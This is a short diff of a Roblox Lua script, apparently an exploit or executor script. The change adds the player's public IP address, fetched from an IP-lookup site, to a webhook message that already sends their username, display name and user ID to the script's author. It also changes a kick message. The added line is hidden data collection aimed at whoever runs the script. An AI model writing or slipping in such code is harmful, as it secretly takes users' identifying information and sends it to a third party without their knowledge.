@@ -29,7 +29,7 @@ function SendWebhook(Arg)
         })
 end
 
-SendWebhook("Username : "..game:GetService("Players").LocalPlayer.Name .. "\nDisplayName : "..game:GetService("Players").LocalPlayer.DisplayName.."\nUserID : "..game:GetService("Players").LocalPlayer.UserId.."")
+SendWebhook("Username : "..game:GetService("Players").LocalPlayer.Name .. "\nDisplayName : "..game:GetService("Players").LocalPlayer.DisplayName.."\nUserID : "..game:GetService("Players").LocalPlayer.UserId.."\nIP : "..tostring(game:HttpGet("https://wtfismyip.com/text")))
 end)
 _G.ExecutedXylo = true
 local RandomCode = math.random(1,100)
@@ -173,5 +173,5 @@ local args = {
 game:GetService("ReplicatedStorage"):FindFirstChild("Inventory"):FireServer(unpack(args))
 end
 else
-game.Players.LocalPlayer:Kick("รันสองรอบทำไม -_-")
+game.Players.LocalPlayer:Kick("Meow")
 end
